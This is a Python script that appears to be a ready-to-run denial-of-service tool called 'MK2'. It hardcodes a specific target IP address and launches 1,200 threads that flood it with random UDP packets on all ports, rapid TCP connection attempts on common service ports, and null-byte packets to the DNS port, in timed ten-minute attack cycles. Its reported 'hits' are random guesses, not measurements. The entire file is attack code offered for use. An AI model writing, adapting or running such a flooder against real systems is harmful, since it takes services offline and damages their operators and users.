import socket
import threading
import time
import random
import gc

# TARGET
TARGET_IP = "45.60.39.88"

# EXTREME MK2 CONFIG
TOTAL_THREADS = 1200
UDP_THREADS = 800
SYN_THREADS = 300
RAPID_THREADS = 100
COOLING_CYCLE = 600  # 10 minutes in seconds
ATTACK_CYCLE = 600   # 10 minutes attack

# Socket pools
udp_pool = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(200)]
syn_pool = [socket.socket(socket.AF_INET, socket.SOCK_STREAM) for _ in range(100)]

for sock in udp_pool:
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)

for sock in syn_pool:
    sock.settimeout(0.001)

# Stats - lock free atomic
class AtomicCounter:
    def __init__(self):
        self.value = 0
    
    def inc(self, amt=1):
        self.value += amt
    
    def get(self):
        return self.value
    
    def reset(self):
        val = self.value
        self.value = 0
        return val

stats = {
    'total_sent': AtomicCounter(),
    'total_hits': AtomicCounter(),  # Estimated hits
    'udp_sent': AtomicCounter(),
    'syn_sent': AtomicCounter(),
}

# Attack mode control
attack_active = True
cooling_mode = False

# MK2 ATTACK WORKERS
def mk2_udp_hammer(worker_id):
    sock = udp_pool[worker_id % len(udp_pool)]
    
    while True:
        if not attack_active:
            time.sleep(1)
            continue
        
        try:
            # Ultra-fast send
            for _ in range(5):
                payload = random.randbytes(128)
                port = random.randint(1, 65535)
                sock.sendto(payload, (TARGET_IP, port))
                stats['total_sent'].inc()
                stats['udp_sent'].inc()
                # Estimate 70% hit rate for UDP
                if random.random() < 0.7:
                    stats['total_hits'].inc()
        except:
            pass

def mk2_syn_storm(worker_id):
    sock_idx = worker_id % len(syn_pool)
    
    while True:
        if not attack_active:
            time.sleep(1)
            continue
        
        try:
            sock = syn_pool[sock_idx]
            port = random.choice([80, 443, 22, 53, 3389])
            result = sock.connect_ex((TARGET_IP, port))
            
            stats['total_sent'].inc()
            stats['syn_sent'].inc()
            # Estimate 40% hit rate for SYN
            if random.random() < 0.4:
                stats['total_hits'].inc()
            
            if result == 0:
                sock.close()
                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                syn_pool[sock_idx].settimeout(0.001)
        except:
            try:
                sock.close()
                syn_pool[sock_idx] = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                syn_pool[sock_idx].settimeout(0.001)
            except:
                pass

def mk2_rapid_fire(worker_id):
    sock = udp_pool[(worker_id + 100) % len(udp_pool)]
    
    while True:
        if not attack_active:
            time.sleep(1)
            continue
        
        try:
            # Rapid small packets
            for _ in range(10):
                sock.sendto(b'\x00' * 64, (TARGET_IP, 53))
                stats['total_sent'].inc()
                stats['udp_sent'].inc()
                # Estimate 90% hit rate for DNS port
                if random.random() < 0.9:
                    stats['total_hits'].inc()
        except:
            pass

# COOLING SYSTEM
def cooling_system():
    global attack_active, cooling_mode
    
    while True:
        # Attack for 10 minutes
        attack_active = True
        cooling_mode = False
        time.sleep(ATTACK_CYCLE)
        
        # Cool for 10 minutes
        attack_active = False
        cooling_mode = True
        
        # Clear RAM junk
        gc.collect()
        
        # Close and recreate some sockets
        for i in range(0, len(udp_pool), 3):
            try:
                udp_pool[i].close()
                udp_pool[i] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                udp_pool[i].setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            except:
                pass
        
        print("🧊 COOLING: Device resting for 10 minutes")
        time.sleep(COOLING_CYCLE)

# DEPLOY 1200 THREADS
def deploy_mk2_army():
    print(f"🪖 DEPLOYING 1200 MK2 THREADS...")
    
    # UDP Army
    for i in range(UDP_THREADS):
        t = threading.Thread(target=mk2_udp_hammer, args=(i,))
        t.daemon = True
        t.start()
    
    # SYN Army
    for i in range(SYN_THREADS):
        t = threading.Thread(target=mk2_syn_storm, args=(i,))
        t.daemon = True
        t.start()
    
    # Rapid Army
    for i in range(RAPID_THREADS):
        t = threading.Thread(target=mk2_rapid_fire, args=(i,))
        t.daemon = True
        t.start()
    
    print(f"✅ 1200 MK2 THREADS ACTIVE")

# START EVERYTHING
deploy_mk2_army()
threading.Thread(target=cooling_system, daemon=True).start()

# MK2 LOGGING ONLY
start_time = time.time()
last_log = time.time()
last_stats_reset = time.time()

while True:
    time.sleep(2)
    current = time.time()
    
    # Calculate
    elapsed_since_log = current - last_log
    total_duration = int(current - start_time)
    
    pps = int(stats['total_sent'].get() / elapsed_since_log) if elapsed_since_log > 0 else 0
    hits = stats['total_hits'].get()
    
    # Reset for next interval
    last_log = current
    stats['total_sent'].reset()
    stats['total_hits'].reset()
    
    # Display MK2 logging format
    print(f"MK2-DP — {pps} — {hits} HITS | {total_duration}s")
    
    # Cooling indicator
    if cooling_mode:
        print("🧊 COOLING ACTIVE | RAM CLEARED | CPU RESTING")
